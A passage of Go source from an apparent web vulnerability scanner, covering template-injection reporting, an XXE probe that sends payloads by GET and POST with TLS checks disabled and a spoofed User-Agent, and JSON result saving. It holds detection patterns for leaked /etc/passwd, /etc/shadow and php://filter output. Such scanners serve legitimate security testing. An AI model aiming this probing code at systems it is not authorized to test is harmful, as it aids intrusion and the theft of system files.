		vuln := VBAVulnerability{
			Type:       "Server-Side Template Injection",
			URL:        testURL,
			Parameter:  param,
			Evidence:   stiEvidence,
			Severity:   severity,
			Confidence: confidence,
		}
		scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
		scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
		mutex.Unlock()
		
		fmt.Printf("[!] Server-Side Template Injection vulnerability found!\n")
		fmt.Printf("    URL: %s\n", testURL)
		fmt.Printf("    Parameter: %s\n", param)
		fmt.Printf("    Payload: %s\n", payload)
		fmt.Printf("    Evidence: %s\n", stiEvidence)
		fmt.Printf("    Severity: %s\n", severity)
		fmt.Printf("    Confidence: %s\n\n", confidence)
	}
	
	// Update stats
	mutex.Lock()
	scanResult.Stats["requests"] = scanResult.Stats["requests"] + 1
	mutex.Unlock()
}

func testXXE(param, payload string) {
	// Construct test URL
	testURL := constructURL(targetURL, param, payload)
	
	if verbose {
		fmt.Printf("[*] Testing parameter '%s' for XXE with payload: %s\n", param, payload)
	}
	
	// Try to catch any panics that might occur during testing
	defer func() {
		if r := recover(); r != nil {
			if verbose {
				fmt.Printf("[!] Panic recovered in XXE testing: %v\n", r)
			}
		}
	}()
	
	// Create custom HTTP client with appropriate headers for XML content
	client := &http.Client{
		Timeout: time.Second * 10,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	
	// Create a request
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error creating request for %s: %s\n", testURL, err)
		}
		return
	}
	
	// Add headers that might help with XXE detection
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "application/xml, text/xml, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	
	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error testing %s: %s\n", testURL, err)
		}
		return
	}
	
	// Also try a POST request with XML payload in the body
	postURL := targetURL
	postBody := strings.NewReader(payload)
	postReq, err := http.NewRequest("POST", postURL, postBody)
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error creating POST request for %s: %s\n", postURL, err)
		}
		// Continue with GET response analysis even if POST fails
	} else {
		postReq.Header.Set("Content-Type", "application/xml")
		postReq.Header.Set("Accept", "application/xml, text/xml, */*")
		postReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
		
		// Send the POST request
		postResp, postErr := client.Do(postReq)
		if postErr == nil {
			defer postResp.Body.Close()
			// We'll analyze the POST response later
		}
	}
	
	// Read GET response body
	body, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error reading response from %s: %s\n", testURL, err)
		}
		return
	}
	
	// Convert body to string for analysis
	bodyStr := string(body)
	
	// Check for successful XXE
	xxeDetected := false
	xxeEvidence := ""
	severity := "Critical"
	confidence := "Medium"
	
	// Check for file content disclosure
	if (strings.Contains(bodyStr, "root:") && strings.Contains(bodyStr, "/bin/bash")) || 
	   strings.Contains(bodyStr, "daemon:") || 
	   strings.Contains(bodyStr, "nobody:") || 
	   strings.Contains(bodyStr, "/etc/passwd") || 
	   strings.Contains(bodyStr, "/etc/shadow") || 
	   strings.Contains(bodyStr, "[boot loader]") || 
	   strings.Contains(bodyStr, "[operating systems]") {
		xxeDetected = true
		xxeEvidence = "File content disclosure detected (system files)"
		severity = "Critical"
		confidence = "High"
	}
	
	// Check for error messages that might indicate XXE vulnerability
	if (strings.Contains(bodyStr, "XML parsing error") || 
	    strings.Contains(bodyStr, "XML document structures must start and end") || 
	    strings.Contains(bodyStr, "unterminated entity reference") || 
	    strings.Contains(bodyStr, "DOCTYPE is not allowed") || 
	    strings.Contains(bodyStr, "Undeclared entity") || 
	    strings.Contains(bodyStr, "undefined entity") || 
	    strings.Contains(bodyStr, "unbound prefix")) && 
	   strings.Contains(payload, "<!DOCTYPE") {
		xxeDetected = true
		xxeEvidence = "XML parsing errors detected, potential XXE vulnerability"
		severity = "Medium"
		confidence = "Medium"
	}
	
	// Check for base64 encoded content that might be file disclosure
	base64Regex := regexp.MustCompile(`[A-Za-z0-9+/]{20,}={0,2}`)
	if base64Regex.MatchString(bodyStr) && strings.Contains(payload, "php://filter/convert.base64-encode") {
		xxeDetected = true
		xxeEvidence = "Base64 encoded content detected, possible file content disclosure"
		severity = "High"
		confidence = "Medium"
	}
	
	// Check for delayed response that might indicate blind XXE
	if resp.StatusCode >= 500 && strings.Contains(payload, "SYSTEM") {
		xxeDetected = true
		xxeEvidence = "Server error detected when using XXE payload, potential blind XXE"
		severity = "High"
		confidence = "Low"
	}
	
	// Check for specific content in response headers that might indicate XXE
	contentType := resp.Header.Get("Content-Type")
	if (strings.Contains(contentType, "application/xml") || 
	    strings.Contains(contentType, "text/xml")) && 
	   (strings.Contains(bodyStr, "ENTITY") || 
	    strings.Contains(bodyStr, "DOCTYPE") || 
	    strings.Contains(bodyStr, "SYSTEM")) {
		xxeDetected = true
		xxeEvidence = "XML content with entity references detected in response"
		severity = "Medium"
		confidence = "Medium"
	}
	
	// If XXE is detected, report it
	if xxeDetected {
		mutex.Lock()
		vuln := VBAVulnerability{
			Type:       "XML External Entity (XXE) Injection",
			URL:        testURL,
			Parameter:  param,
			Evidence:   xxeEvidence,
			Severity:   severity,
			Confidence: confidence,
		}
		scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
		scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
		mutex.Unlock()
		
		fmt.Printf("[!] XML External Entity (XXE) vulnerability found!\n")
		fmt.Printf("    URL: %s\n", testURL)
		fmt.Printf("    Parameter: %s\n", param)
		fmt.Printf("    Payload: %s\n", payload)
		fmt.Printf("    Evidence: %s\n", xxeEvidence)
		fmt.Printf("    Severity: %s\n", severity)
		fmt.Printf("    Confidence: %s\n\n", confidence)
	}
	
	// Update stats
	mutex.Lock()
	scanResult.Stats["requests"] = scanResult.Stats["requests"] + 1
	mutex.Unlock()
}

func saveResults() {
	// Convert scan results to JSON
	jsonData, err := json.MarshalIndent(scanResult, "", "  ")
	if err != nil {
		fmt.Printf("[!] Error converting results to JSON: %s\n", err)
		return
	}
	
	// Write to file
	err = ioutil.WriteFile(outputFile, jsonData, 0644)
	if err != nil {
		fmt.Printf("[!] Error writing results to file: %s\n", err)
		return
	}
	
	fmt.Printf("[+] Scan results saved to: %s\n", outputFile)
}
